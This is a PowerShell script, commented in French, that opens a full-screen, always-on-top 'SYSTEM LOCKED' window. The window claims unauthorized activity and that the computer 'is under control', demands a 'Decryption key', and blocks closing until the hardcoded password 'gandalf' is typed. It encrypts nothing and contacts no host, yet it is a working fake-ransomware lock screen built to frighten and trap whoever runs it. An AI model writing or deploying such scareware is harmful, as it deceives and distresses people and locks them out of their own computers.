Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Password = "gandalf"

# Fenêtre
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = [System.Drawing.Color]::Black
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.KeyPreview = $true

# Polices
$fontTitle = New-Object System.Drawing.Font("Consolas", 36, [System.Drawing.FontStyle]::Bold)
$fontText  = New-Object System.Drawing.Font("Consolas", 22)
$fontPwd   = New-Object System.Drawing.Font("Consolas", 20)

# Texte principal
$title = New-Object System.Windows.Forms.Label
$title.Dock = 'Top'
$title.Height = 120
$title.ForeColor = [System.Drawing.Color]::Red
$title.TextAlign = 'MiddleCenter'
$title.Font = $fontTitle
$title.Text = "SYSTEM LOCKED"

$text = New-Object System.Windows.Forms.Label
$text.Dock = 'Top'
$text.Height = 260
$text.ForeColor = [System.Drawing.Color]::White
$text.TextAlign = 'MiddleCenter'
$text.Font = $fontText
$text.Text = @"
Unauthorized activity detected.

This computer is under control.
All actions are being logged.

Do NOT turn off your computer.
"@

# Label MDP
$pwdLabel = New-Object System.Windows.Forms.Label
$pwdLabel.Text = "Decryption key:"
$pwdLabel.ForeColor = [System.Drawing.Color]::White
$pwdLabel.Font = $fontPwd
$pwdLabel.AutoSize = $true
$pwdLabel.Left = ($form.ClientSize.Width / 2) - 120
$pwdLabel.Top  = ($form.ClientSize.Height / 2) - 40

# Champ MDP (blanc, bien visible)
$textbox = New-Object System.Windows.Forms.TextBox
$textbox.Font = $fontPwd
$textbox.Width = 360
$textbox.UseSystemPasswordChar = $true
$textbox.TextAlign = 'Center'
$textbox.BackColor = [System.Drawing.Color]::White
$textbox.ForeColor = [System.Drawing.Color]::Black
$textbox.BorderStyle = 'FixedSingle'
$textbox.Left = ($form.ClientSize.Width / 2) - 180
$textbox.Top  = ($form.ClientSize.Height / 2) + 10

# Validation
$textbox.Add_KeyDown({
    if ($_.KeyCode -eq "Enter") {
        if ($textbox.Text -eq $Password) {
            $form.Close()
        } else {
            [System.Media.SystemSounds]::Hand.Play()
            $textbox.Clear()
        }
    }
})

# Bloquer la fermeture (Alt+F4, etc.)
$form.Add_FormClosing({
    if ($textbox.Text -ne $Password) {
        $_.Cancel = $true
    }
})

# Son au démarrage
[System.Media.SystemSounds]::Exclamation.Play()

$form.Controls.Add($title)
$form.Controls.Add($text)
$form.Controls.Add($pwdLabel)
$form.Controls.Add($textbox)

[System.Windows.Forms.Application]::Run($form)

